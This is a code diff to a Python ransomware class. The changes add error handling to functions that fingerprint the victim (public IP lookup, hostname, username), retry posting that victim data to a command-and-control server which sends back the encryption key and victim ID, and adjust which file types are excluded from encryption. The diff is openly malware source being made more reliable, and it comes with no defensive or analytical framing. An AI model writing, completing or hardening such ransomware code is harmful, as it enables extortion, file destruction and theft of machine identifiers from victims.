@@ -11,7 +11,7 @@ from time import sleep
 # Debug variables
 c2_url = "http://localhost:5000"
 target_paths = [".\\toencrypt"]
-exclude_types = (".exe", ".mobi")
+exclude_types = (".exe", ".dll", ".img")
 
 
 class Ransomware:
@@ -19,14 +19,13 @@ class Ransomware:
 
     def __init__(self):
         # Get Public IP as one of the identification indicators
-        self.public_ip = httpx.get("https://ipconfig.io/ip").text.replace("\n", "")
+        self.public_ip = self.get_public_ip()
 
         # Get current date to estimate when contact was established
         self.firstContact = datetime.datetime.now()
 
         # Get hostname/username as another identification indicator
-        self.hostname = os.environ["COMPUTERNAME"]
-        self.username = os.environ["USERNAME"]
+        self.hostname, self.username = self.get_system_info()
 
         # Data which will be received by C2 server later on
         self.encryption_key = None
@@ -37,6 +36,29 @@ class Ransomware:
 
     def __str__(self):
         return f"IP: {self.public_ip}, Date: {self.firstContact}, Username: {self.username}, Hostname: {self.hostname}, Key: {self.encryption_key}, ID: {self.victim_id}"
+
+    def get_public_ip(self):
+        try:
+            ip = httpx.get("https://ipconfig.io/ip", timeout=5).text.replace("\n", "")
+            return ip
+        except httpx.TimeoutException as err:
+            print("get_public_ip(): Timeout Error --> ", err)
+            return "0.0.0.0"
+        except httpx.RequestError as err:
+            print("get_public_ip(): Request Exception --> ", err)
+            return "0.0.0.0"
+
+    def get_system_info(self):
+        try:
+            hostname = os.environ["COMPUTERNAME"]
+            username = os.environ["USERNAME"]
+            return hostname, username
+        except KeyError as err:
+            print("get_system_info(): Key Error --> ", err)
+            return "generic_hostname", "generic_username"
+        except OSError as err:
+            print("get_system_info(): OS Error --> ", err)
+            return "generic_hostname", "generic_username"
 
     def check_for_infection(self):
         # If this variable is set, then we have been on this system before
@@ -55,7 +77,15 @@ class Ransomware:
         }
         # Send victim data via HTTP Form post to the C2 server
         # TODO: Try/Fail in case of bad/no internet connection?
-        response = httpx.post(f"{c2_url}/create", files=payload)
+        try:
+            response = httpx.post(f"{c2_url}/create", files=payload)
+        except httpx.TimeoutException as err:
+            print("create_remote_entry(): Timeout Error --> ", err)
+            sleep(60)
+            response = httpx.post(f"{c2_url}/create", files=payload)
+        except httpx.RequestError as err:
+            print("create_remote_entry(): Request Exception --> ", err)
+            response = httpx.post(f"{c2_url}/create", files=payload)
         # Receive encryption key and identifier via Response headers
         self.encryption_key = response.headers["victim-key"]
         self.victim_id = response.headers["victim-id"]
